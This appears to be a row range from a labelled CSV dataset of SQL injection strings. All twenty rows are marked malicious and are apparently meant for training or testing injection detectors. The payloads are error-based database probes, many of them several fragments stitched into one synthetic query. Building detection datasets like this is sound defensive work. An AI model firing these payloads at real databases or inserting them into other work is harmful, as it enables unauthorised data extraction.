row_index,payload_norm,label,sqli_type_hint
35440,"select * from users WHERE username = ""-8828%\' ) ) ) and username = ""1 ) ) as atiy where 3855 = 3855 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --""",1,
35441,"SELECT * FROM users WHERE usErnamE = ""1\'+ ( sElECt \'pvEj\' whErE 4496 = 4496 and 6055 = Ctxsys.drithsx.sn ( 6055, ( Chr ( 113 ) ||Chr ( 113 ) ||Chr ( 112 ) ||Chr ( 106 ) ||Chr ( 113 ) || ( sElECt ( CasE whEn ( 6055 = 6055 ) thEn 1 ElsE 0 End ) from dual ) ||Chr ( 113 ) ||Chr ( 122 ) ||Chr ( 118 ) ||Chr ( 122 ) ||Chr ( 113 ) ) ) ) +\'"" OR username = ""-1157 ) ) as sxie where 7118 = 7118",1,
35442,"select * from users WHERE username = ""1\' and username = ""-9564 or username = ""-9263\' ) as qodg where 6798 = 6798 and 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --""",1,
35443,"select * from users WHERE username = ""1\' ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( \'yxpi\' = \'yxpi"" and username = ""-5152\' ) ) || 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) )",1,
35444,"select * from users WHERE username = ""-1190\' or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'xopg\' = \'xopg"" and username = ""1 ) ) )",1,
35445,"select * from users WHERE username = ""-1889%\' ) ) ) and username = ""-1641\' ) ) and username = ""1\' ) as pogx where 4105 = 4105 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --""",1,
35446,"select * from users WHERE username = ""1\' ) ) and ( \'mndw\' = \'mndw"" or username = ""1 ) ) ) and ( ( ( 4694 = 4694"" and username = ""-8163 ) ) as cvai where 2360 = 2360",1,
35447,"select * from users WHERE username = ""-8860 ) and username = ""-2756\' where 6156 = 6156 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" or username = ""-3859 )",1,
35448,"select * from users WHERE username = ""-8112\' ) ) ) and ( ( ( \'xopg\' = \'xopg"" or username = ""1\'|| ( select \'tisi\' from dual where 1616 = 1616 and username = ""-8057\' ) ) as gpue where 4205 = 4205",1,
35449,"select * from users WHERE username = ""1\' ) and username = ""-5863"" and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'%\' = \'""",1,
35450,"select * from users WHERE username = ""1%\' ) ) ) and username = ""-8007\' ) ) as bgpp where 9555 = 9555 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" or username = ""-7242\' or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )",1,
35451,"select * from users WHERE username = ""1\' ) ) ) and ( ( ( \'ykjs\' like \'ykjs"" and username = ""-8021\' ) )",1,
35452,"select * from users WHERE username = ""-4952\' ) ) ) and username = ""-9987 ) ) ) or ( ( ( 2114 = 2114""",1,
35453,"select * from users WHERE username = ""1 and username = ""-5863"" and username = ""-1344 ) as gqgi where 2545 = 2545",1,
35454,"select * from users WHERE username = ""1\' ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) or username = ""-9295 ) ) ) and username = ""-7430\' ) as xfah where 1596 = 1596",1,
35455,"select * from users WHERE username = ""-8828%\' ) ) ) or username = ""1%\' ) ) ) and ( ( ( \'%\' = \'"" and username = ""1\'+ ( select vohg where 6383 = 6383",1,
35456,"select * from users WHERE username = ""-7199\' and username = ""-9564 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) "" and username = ""-1549\' ) and ( \'fnwx\' = \'fnwx""",1,
35457,"select * from users WHERE username = ""-7184 ) as fshx where 3408 = 3408 and username = ""1\' ) ) and ( ( \'yhku\' like \'yhku""",1,
35458,"select * from users WHERE username = ""1 ) as nbno where 9816 = 9816 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and username = ""-3899\' ) where 8152 = 8152",1,
35459,"select * from users WHERE username = ""1\'+ ( select oljg where 2006 = 2006 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ) +\'"" and username = ""-4108\' ) and ( \'tqjx\' = \'tqjx"" or username = ""-6190\' ) where 2621 = 2621",1,
